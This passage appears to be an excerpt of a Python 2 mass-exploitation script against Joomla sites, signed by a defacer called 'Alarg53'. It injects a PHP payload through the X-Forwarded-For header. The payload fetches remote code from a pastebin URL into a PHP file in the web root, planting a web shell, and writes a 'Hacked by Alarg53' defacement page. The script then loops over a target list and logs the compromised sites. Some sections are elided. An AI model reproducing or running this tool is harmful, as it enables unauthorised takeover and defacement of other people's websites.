...
def get_url(url, user_agent):
    ...
    'x-forwarded-for': user_agent   # Alarg53 Is Here
    }
...
pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Alarg53.php','w+'),file_get_contents('http://pastebin.com/raw/tQyPFJkp')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Alarg53.html','w+'),'Hacked by Alarg53');")
for i in fil.readlines():
  try:
    i=i.strip()
    print get_url(i, pl)
    lala=requests.get(i+"/Alarg53.html")
    if "Hacked" in lala.content:
     z=open('Joomla_3.5_Shell.txt','a')
     z.write(i+"/Alarg53.html\n")
     z.close()
  except:
    pass
